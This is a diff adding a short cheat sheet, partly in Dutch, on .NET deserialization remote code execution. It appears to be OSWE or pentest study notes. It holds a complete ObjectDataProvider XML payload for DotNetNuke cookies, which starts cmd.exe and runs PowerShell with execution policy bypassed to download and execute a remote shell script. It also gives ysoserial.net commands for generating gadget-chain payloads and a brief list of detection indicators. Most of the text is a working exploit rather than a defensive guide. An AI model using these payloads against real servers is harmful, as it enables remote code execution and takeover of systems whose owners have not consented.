@@ -1,0 +1,30 @@
+# .NET Deserialization RCE
+# === XmlSerializer + ObjectDataProvider (DotNetNuke) ===
+# Payload in cookie/parameter (base64 of URL-encoded XML):
+# <ObjectDataProvider>
+#   <ObjectInstance xsi:type="ExpandedWrapper`2[[Process],[ObjectDataProvider]]">
+#     <ProjectedProperty0>
+#       <MethodName>Start</MethodName>
+#       <MethodParameters>
+#         <string>cmd.exe</string>
+#         <string>/c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/payloads/amsi-shell.ps1')</string>
+#       </MethodParameters>
+#       <ObjectInstance xsi:type="Process"/>
+#     </ProjectedProperty0>
+#   </ObjectInstance>
+# </ObjectDataProvider>
+# === ysoserial.net payload generatie ===
+ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c "cmd /c whoami" -o raw
+ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" -o base64
+ysoserial.exe -g WindowsIdentity -f Json.Net -c "cmd /c whoami" -o raw
+# === Veelgebruikte .NET gadgets ===
+# ObjectDataProvider (XmlSerializer)
+# TypeConfuseDelegate (BinaryFormatter)
+# PSObject (BinaryFormatter, PowerShell)
+# WindowsIdentity (Json.Net)
+# === Detectie ===
+# Zoek naar: BinaryFormatter, XmlSerializer, JavaScriptSerializer, Json.Net
+# Base64 content in cookies, ViewState, hidden form fields
+# Content-Type: application/soap+xml
+# Tip: ysoserial.net is de standaard tool voor .NET deser payloads
+# Tip: DotNetNuke DNNPersonalization cookie = classic OSWE target
